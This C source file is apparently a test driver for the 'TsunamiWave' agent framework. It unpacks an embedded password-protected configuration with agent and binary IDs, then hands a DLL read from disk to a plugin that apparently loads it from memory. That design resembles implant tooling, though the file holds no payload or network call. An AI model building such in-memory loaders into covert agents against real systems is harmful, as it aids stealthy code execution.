#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_ConfigBinary.h"

#include "EXE_LoadLibrary.h"
#include "LIB_LoadLibrary.h"

// Primary TsunamiWave Configuration
BYTE _ConfigBytes[CONFIG_DEFAULT_BUFSIZE] = CONFIG_DEFAULT_MAGIC_NUMBER;
CHAR _ConfigPassword[] = CONFIG_DEFAULT_PASSWORD;


DWORD wmain(INT argc, LPCWCHAR argv[], LPCWCHAR envp[])
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD dwTempErrorCode = ERROR_SUCCESS;


	CHAR*	szJsonInput = NULL;
	DWORD	dwJsonInputSize = 0;
	cJSON*	lpJsonInput = NULL;
	cJSON*	lpJsonInputPassword = NULL;
	cJSON*	lpJsonPackedBuffer = NULL;
	cJSON*	lpJsonRequestEntries = NULL;
	cJSON*	lpJsonRequestEntry = NULL;
	cJSON*	lpJsonLibraryBuffer = NULL;

	CHAR*	szJsonOutput = NULL;
	DWORD	dwJsonOutputSize = 0;
	cJSON*	lpJsonOutput = NULL;
	cJSON*	lpJsonOutputUnpackedBuffer = NULL;
	cJSON*	lpJsonMessageType = NULL;
	cJSON*	lpJsonOutputResults = NULL;
	cJSON*	lpJsonOutputResult = NULL;

	CHAR*	szJsonConfiguration = NULL;
	DWORD	dwJsonConfigurationSize = 0;
	cJSON*	lpJsonConfiguration = NULL;

	cJSON*	lpJsonBinaryId = NULL;
	cJSON*	lpJsonAgentId = NULL;

	DWORD	dwIndex = 0;

	CHAR	szLibraryFileName[MAX_PATH];
	LPBYTE	lpLibraryContents = NULL;
	DWORD	dwLibraryContentsSize = 0;


	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_LoadLibrary wmain() start"));

			/********************************************************************************************
				Check Arguments
			********************************************************************************************/
			ZeroMemory(szLibraryFileName, MAX_PATH);
			if (2 == argc)
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("argv[1]: %s"), argv[1]);
				wcstombs(szLibraryFileName, argv[1], MAX_PATH);
			}
			else
			{
				DBGPRINT(DEBUG_ERROR, TEXT("%s <dll_filename>"), argv[0]);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szLibraryFileName: %S"), szLibraryFileName);


			/***************************************************************************
				Initialize the ConfigBinary plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the ConfigBinary plugin"));
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("ConfigBinaryInitialization( %p, %p, %d )"),
				NULL,
				NULL,
				0
			);
			dwErrorCode = ConfigBinaryInitialization(
				NULL,
				NULL,
				0
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ConfigBinaryInitialization( %p, %p, %d ) failed.(%08x)"),
					NULL,
					NULL,
					0,
					dwErrorCode
				);
				__leave;
			}


			/***************************************************************************
				Send message to ConfigBinary plugin to retrieve the configuration json
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Retrieve the packed configuration using the ConfigBinaryCallbackInterface"));

			// Create the input JSON object for the callback
			lpJsonInput = cJSON_CreateObject();
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			// Create the message type for the JSON object
			if (NULL == cJSON_AddNumberToObject(lpJsonInput, TSM_MESSAGE_TYPE, TSM_STORAGE_RETRIEVE_REQUEST))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_AddNumberToObject(%p, %S, %d) failed."),
					lpJsonOutput,
					TSM_MESSAGE_TYPE,
					TSM_STORAGE_RETRIEVE_REQUEST
				);
				__leave;
			}

			// Create the password string for the input JSON object
			lpJsonInputPassword = cJSON_CreateString(_ConfigPassword);
			if (NULL == lpJsonInputPassword)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInputPassword = cJSON_CreateString(%p) failed."),
					_ConfigPassword
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonInput, ConfigBinary_Request_Packed_Password, lpJsonInputPassword);

			// Create the packed buffer string for the input JSON object
			lpJsonPackedBuffer = cJSON_CreateString((char*)_ConfigBytes);
			if (NULL == lpJsonPackedBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonPackedBuffer = cJSON_CreateString(%S) failed."),
					_ConfigBytes
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonInput, ConfigBinary_Request_Packed_Buffer, lpJsonPackedBuffer);

			// Create the string representation of the TSM_STORAGE_RETRIEVE_REQUEST
			szJsonInput = cJSON_Print(lpJsonInput);
			if (NULL == szJsonInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("szJsonInput = cJSON_Print(%p) failed."),
					lpJsonInput
				);
				__leave;
			}
			dwJsonInputSize = (DWORD)strlen(szJsonInput);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonInputSize: %d"), dwJsonInputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonInput:     %p"), szJsonInput);
			//printf("szJsonInput: \n%s\n", szJsonInput);

			// Actually call the ConfigBinaryCallbackInterface passing the JSON input object
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("ConfigBinaryCallbackInterface( %p, %d, %p, %p )"),
				(LPBYTE)szJsonInput,
				dwJsonInputSize,
				(LPBYTE*)&szJsonOutput,
				&dwJsonOutputSize
			);
			dwErrorCode = ConfigBinaryCallbackInterface(
				(LPBYTE)szJsonInput,
				dwJsonInputSize,
				(LPBYTE*)&szJsonOutput,
				&dwJsonOutputSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ConfigBinaryCallbackInterface( %p, %d, %p, %p ) failed.(%08x)"),
					(LPBYTE)szJsonInput,
					dwJsonInputSize,
					(LPBYTE*)&szJsonOutput,
					&dwJsonOutputSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonOutputSize: %d"), dwJsonOutputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			//printf("szJsonOutput:\n%s\n", szJsonOutput);

			// Parse the output string into a JSON object
			lpJsonOutput = cJSON_Parse(szJsonOutput);
			if (NULL == lpJsonOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonOutput = cJSON_Parse(%p) failed."),
					szJsonOutput
				);
				__leave;
			}

			// Get the response message type
			lpJsonMessageType = cJSON_GetObjectItemCaseSensitive(lpJsonOutput, TSM_MESSAGE_TYPE);
			if (NULL == lpJsonMessageType)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonMessageType = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonOutput,
					TSM_MESSAGE_TYPE
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonMessageType))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonMessageType
				);
				__leave;
			}
			// Check the message type for the correct response
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonMessageType: %d (%08x)"), lpJsonMessageType->valueint, lpJsonMessageType->valueint);
			if (TSM_STORAGE_RETRIEVE_RESPONSE != lpJsonMessageType->valueint)
			{
				dwErrorCode = ERROR_UNSUPPORTED_TYPE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("Invalid message type: %d (%08x)"),
					lpJsonMessageType->valueint,
					lpJsonMessageType->valueint
				);
				__leave;
			}

			// Get the unpacked configuration buffer
			lpJsonOutputUnpackedBuffer = cJSON_GetObjectItemCaseSensitive(lpJsonOutput, ConfigBinary_Response_Unpacked_Buffer);
			if (NULL == lpJsonOutputUnpackedBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonOutputUnpackedBuffer = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonOutput,
					ConfigBinary_Response_Unpacked_Buffer
				);
				__leave;
			}
			if (cJSON_IsBytes(lpJsonOutputUnpackedBuffer))
			{
				// Get the actual bytes of the unpacked configuration buffer
				szJsonConfiguration = (char*)cJSON_GetBytesValue(lpJsonOutputUnpackedBuffer, (int*)&dwJsonConfigurationSize);
				if (NULL == szJsonConfiguration)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("szJsonConfiguration = (char*)cJSON_GetBytesValue(%p, %p) failed."),
						lpJsonOutputUnpackedBuffer,
						(int*)&dwJsonConfigurationSize
					);
					__leave;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonConfigurationSize: %d"), dwJsonConfigurationSize);
				DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonConfiguration:    %p"), szJsonConfiguration);
				//printf("szJsonConfiguration:\n%s\n", szJsonConfiguration);

				// Parse the configuration JSON from the unpacked buffer
				lpJsonConfiguration = cJSON_Parse(szJsonConfiguration);
				if (NULL == lpJsonConfiguration)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonConfiguration = cJSON_Parse(%p) failed."),
						szJsonConfiguration
					);
					__leave;
				}

				// Get the binary id
				lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, ConfigBinary_Response_Binary_Id);
				if (NULL == lpJsonBinaryId)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
						lpJsonConfiguration,
						ConfigBinary_Response_Binary_Id
					);
					__leave;
				}
				if (!cJSON_IsNumber(lpJsonBinaryId))
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("cJSON_IsNumber(%p) failed."),
						lpJsonBinaryId
					);
					__leave;
				}
				DBGPRINT(DEBUG_INFO, TEXT("%S: %d"), ConfigBinary_Response_Binary_Id, lpJsonBinaryId->valueint);

				// Get the agent id
				lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, ConfigBinary_Response_Agent_Id);
				if (NULL == lpJsonAgentId)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
						lpJsonConfiguration,
						ConfigBinary_Response_Agent_Id
					);
					__leave;
				}
				if (!cJSON_IsNumber(lpJsonAgentId))
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("cJSON_IsNumber(%p) failed."),
						lpJsonAgentId
					);
					__leave;
				}
				DBGPRINT(DEBUG_INFO, TEXT("%S: %d"), ConfigBinary_Response_Agent_Id, lpJsonAgentId->valueint);

				// Get any other configuration settings

			} // end if (cJSON_IsBytes(lpJsonOutputUnpackedBuffer))
			else
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsBytes(%p) failed."),
					lpJsonOutputUnpackedBuffer
				);
				__leave;
			}

			// Delete input and output JSON objects
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}
			if (NULL != lpJsonOutput)
			{
				cJSON_Delete(lpJsonOutput);
				lpJsonOutput = NULL;
			}
			// Free input and output JSON strings
			if (NULL != szJsonInput)
			{
				cJSON_free(szJsonInput);
				szJsonInput = NULL;
			}
			if (NULL != szJsonOutput)
			{
				cJSON_free(szJsonOutput);
				szJsonOutput = NULL;
			}


			/***************************************************************************
				Initialize the LoadLibrary plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the LoadLibrary plugin"));
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("LoadLibraryInitialization(%p, %p, %d)"),
				NULL,
				(LPBYTE)szJsonConfiguration,
				dwJsonConfigurationSize
			);
			dwErrorCode = LoadLibraryInitialization(
				(FARPROC)NULL,
				(LPBYTE)szJsonConfiguration,
				dwJsonConfigurationSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("LoadLibraryInitialization(%p, %p, %d) failed.(%08x)"),
					NULL,
					(LPBYTE)szJsonConfiguration,
					dwJsonConfigurationSize,
					dwErrorCode
				);
				__leave;
			}


			/***************************************************************************
				Use the LoadLibraryCallbackInterface
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Use the LoadLibraryCallbackInterface"));

			// Create the input JSON object for the callback
			lpJsonInput = cJSON_CreateObject();
			if (NULL == lpJsonInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonInput = cJSON_CreateObject failed.\n")
				);
				__leave;
			}

			// Create the message type for the JSON object
			if (NULL == cJSON_AddNumberToObject(lpJsonInput, TSM_MESSAGE_TYPE, TSM_LOADER_LOAD_DLL_REQUEST))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_AddNumberToObject(%p, %S, %d) failed."),
					lpJsonInput,
					TSM_MESSAGE_TYPE,
					TSM_EXECUTER_EXECUTE_CMD_REQUEST
				);
				__leave;
			}

			// Create a JSON array of request objects
			lpJsonRequestEntries = cJSON_AddArrayToObject(lpJsonInput, LoadLibrary_Request_Entries);
			if (NULL == lpJsonRequestEntries)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonRequestEntries = cJSON_AddArrayToObject(%p,%S) failed."),
					lpJsonInput,
					LoadLibrary_Request_Entries
				);
				__leave;
			}

			// Create the request entry string for the input JSON object
			lpJsonRequestEntry = cJSON_CreateObject();
			if (NULL == lpJsonRequestEntry)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonRequestEntry = cJSON_CreateObject() failed.")
				);
				__leave;
			}

			// Get the library file contents
			dwErrorCode = ReadFileIntoBuffer(
				szLibraryFileName,
				&lpLibraryContents,
				&dwLibraryContentsSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("ReadFileIntoBuffer( %d, %p ) failed.(%08x)"),
					"test.dll",
					&lpLibraryContents,
					&dwLibraryContentsSize,
					dwErrorCode);
				__leave;
			}

			// Create the LoadLibrary_Request_LibraryBuffer input JSON object
			lpJsonLibraryBuffer = cJSON_CreateBytes(lpLibraryContents, dwLibraryContentsSize);
			if (NULL == lpJsonLibraryBuffer)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonLibraryBuffer = cJSON_CreateBytes(%p,%d) failed."),
					lpLibraryContents, 
					dwLibraryContentsSize
				);
				__leave;
			}
			cJSON_AddItemToObject(lpJsonRequestEntry, LoadLibrary_Request_LibraryBuffer, lpJsonLibraryBuffer);

			// Add entry to array of entries
			cJSON_AddItemToArray(lpJsonRequestEntries, lpJsonRequestEntry);

			// Create the string representation of the TSM_EXECUTER_EXECUTE_CMD_REQUEST
			szJsonInput = cJSON_Print(lpJsonInput);
			if (NULL == szJsonInput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("szJsonInput = cJSON_Print(%p) failed."),
					lpJsonInput
				);
				__leave;
			}
			dwJsonInputSize = (DWORD)strlen(szJsonInput);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonInputSize: %d"), dwJsonInputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonInput:     %p"), szJsonInput);
			//printf("szJsonInput: \n%s\n", szJsonInput);

			// Call the LoadLibraryCallbackInterface passing in the JSON input object and receiving the JSON output object
			DBGPRINT(
				DEBUG_VERBOSE,
				TEXT("LoadLibraryCallbackInterface(%p, %d, %p, %p)"),
				(LPBYTE)szJsonInput,
				dwJsonInputSize,
				(LPBYTE*)&szJsonOutput,
				&dwJsonOutputSize
			);
			dwErrorCode = LoadLibraryCallbackInterface(
				(LPBYTE)szJsonInput,
				dwJsonInputSize,
				(LPBYTE*)&szJsonOutput,
				&dwJsonOutputSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("LoadLibraryCallbackInterface(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szJsonInput,
					dwJsonInputSize,
					(LPBYTE*)&szJsonOutput,
					&dwJsonOutputSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwJsonOutputSize: %d"), dwJsonOutputSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szJsonOutput:     %p"), szJsonOutput);
			//printf("szJsonOutput:\n%s\n", szJsonOutput);

			// Parse the output string into a JSON object
			lpJsonOutput = cJSON_Parse(szJsonOutput);
			if (NULL == lpJsonOutput)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonOutput = cJSON_Parse(%p) failed."),
					szJsonOutput
				);
				__leave;
			}

			// Get the response message type
			lpJsonMessageType = cJSON_GetObjectItemCaseSensitive(lpJsonOutput, TSM_MESSAGE_TYPE);
			if (NULL == lpJsonMessageType)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonMessageType = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonOutput,
					TSM_MESSAGE_TYPE
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonMessageType))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonMessageType
				);
				__leave;
			}
			// Check the message type for the correct response
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpJsonMessageType: %d (%08x)"), lpJsonMessageType->valueint, lpJsonMessageType->valueint);
			if (TSM_LOADER_LOAD_DLL_RESPONSE != lpJsonMessageType->valueint)
			{
				dwErrorCode = ERROR_UNSUPPORTED_TYPE;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("Invalid message type: %d (%08x)"),
					lpJsonMessageType->valueint,
					lpJsonMessageType->valueint
				);
				__leave;
			}

			// Get the response results array
			lpJsonOutputResults = cJSON_GetObjectItemCaseSensitive(lpJsonOutput, LoadLibrary_Response_Results);
			if (NULL == lpJsonOutputResults)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonOutputResults = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonOutput,
					LoadLibrary_Response_Results
				);
				__leave;
			}
			if (!cJSON_IsArray(lpJsonOutputResults))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsArray(%p) failed."),
					lpJsonOutputResults
				);
				__leave;
			}
			// Loop through all the output results objects and display them
			dwIndex = 0;
			cJSON_ArrayForEach(lpJsonOutputResult, lpJsonOutputResults)
			{
				cJSON*	lpJsonModulePointer = NULL;
				LPBYTE	lpJsonModulePointerBuffer = NULL;
				int		nJsonModulePointerBufferSize = 0;

				DBGPRINT(DEBUG_VERBOSE, TEXT("%S[%d]:"), LoadLibrary_Response_Results, dwIndex);

				// Get and display the LoadLibrary_Response_ProcessId
				lpJsonModulePointer = cJSON_GetObjectItemCaseSensitive(lpJsonOutputResult, LoadLibrary_Response_ModuleHandle);
				if (NULL == lpJsonModulePointer)
				{
					//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("lpJsonModulePointer = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
						lpJsonOutputResult,
						LoadLibrary_Response_ModuleHandle
					);
					continue;
				}
				if (
					( !cJSON_IsBytes(lpJsonModulePointer) ) ||
					( NULL == lpJsonModulePointer->valuestring )
					)
				{
					//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_IsBytes(%p) failed."),
						lpJsonModulePointer
					);
					continue;
				}
				lpJsonModulePointerBuffer = cJSON_GetBytesValue(lpJsonModulePointer, &nJsonModulePointerBufferSize);
				if (NULL == lpJsonModulePointerBuffer)
				{
					//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_GetBytesValue(%p, %p) failed."),
						lpJsonModulePointer,
						&nJsonModulePointerBufferSize
					);
					continue;
				}
				DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S: %p"), LoadLibrary_Response_ModuleHandle, *((HMODULE*)lpJsonModulePointerBuffer));

				// free allocated buffer
				cJSON_free(lpJsonModulePointerBuffer);
				lpJsonModulePointerBuffer = NULL;


				// Continue to next lpJsonOutputResults
				dwIndex++;

			} // end cJSON_ArrayForEach(lpJsonOutputResult, lpJsonOutputResults)

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}
			if (NULL != lpJsonOutput)
			{
				cJSON_Delete(lpJsonOutput);
				lpJsonOutput = NULL;
			}
			// Free input and output JSON strings
			if (NULL != szJsonInput)
			{
				cJSON_free(szJsonInput);
				szJsonInput = NULL;
			}
			if (NULL != szJsonOutput)
			{
				cJSON_free(szJsonOutput);
				szJsonOutput = NULL;
			}
			// Delete configuration JSON object
			if (NULL != lpJsonConfiguration)
			{
				cJSON_Delete(lpJsonConfiguration);
				lpJsonConfiguration = NULL;
			}


			/***************************************************************************
				Finalize the LoadLibrary plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the LoadLibrary plugin"));
			DBGPRINT(DEBUG_VERBOSE, TEXT("LoadLibraryFinalization( )"));
			dwTempErrorCode = LoadLibraryFinalization();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("LoadLibraryFinalization( ) failed.(%08x)"), dwTempErrorCode);
				__leave;
			}


			/***************************************************************************
				Finalize the ConfigBinary plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the ConfigBinary plugin"));
			DBGPRINT(DEBUG_VERBOSE, TEXT("ConfigBinaryFinalization( )"));
			dwTempErrorCode = ConfigBinaryFinalization();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("ConfigBinaryFinalization( ) failed.(%08x)"), dwTempErrorCode);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_LoadLibrary wmain() end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}
